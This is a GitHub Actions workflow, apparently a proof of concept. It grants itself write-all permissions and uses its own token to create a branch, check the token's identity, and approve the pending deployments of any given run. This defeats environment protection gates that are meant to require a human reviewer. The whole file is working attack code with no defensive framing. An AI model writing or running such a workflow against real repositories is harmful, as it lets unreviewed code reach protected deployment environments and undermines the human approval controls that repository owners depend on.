name: approver
on:
  workflow_dispatch:
    inputs:
      run_id:
        description: run id
        required: true
permissions: write-all
jobs:
  approve:
    runs-on: ubuntu-latest
    steps:
      - name: prove-write
        run: |
          curl -s -X POST -H "Authorization: token ${{ github.token }}" -H "Content-Type: application/json" https://api.github.com/repos/${{ github.repository }}/git/refs -d "{\"ref\":\"refs/heads/proof-${RANDOM}\",\"sha\":\"${{ github.sha }}\"}" -w "\nref_http=%{http_code}\n"
      - name: identity
        run: |
          echo "identity-check:"
          curl -s -H "Authorization: token ${{ github.token }}" https://api.github.com/user | head -c 300 || true
          echo
      - name: approve
        env:
          RUN_ID: ${{ inputs.run_id }}
        run: |
          curl -s -H "Authorization: token ${{ github.token }}" "https://api.github.com/repos/${{ github.repository }}/actions/runs/${RUN_ID}/pending_deployments" -o pending.json -w "pending_http=%{http_code}\n"
          cat pending.json
          echo
          IDS=$(jq -c '[.[].environment.id]' pending.json)
          BODY="{\"environment_ids\":$IDS,\"state\":\"approved\",\"comment\":\"gh-token-writeall-self-approve\"}"
          echo "ids=$IDS"
          echo "body=$BODY"
          curl -s -X POST -H "Authorization: token ${{ github.token }}" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/${{ github.repository }}/actions/runs/${RUN_ID}/pending_deployments" -d "$BODY" -w "\napprove_http=%{http_code}\n"
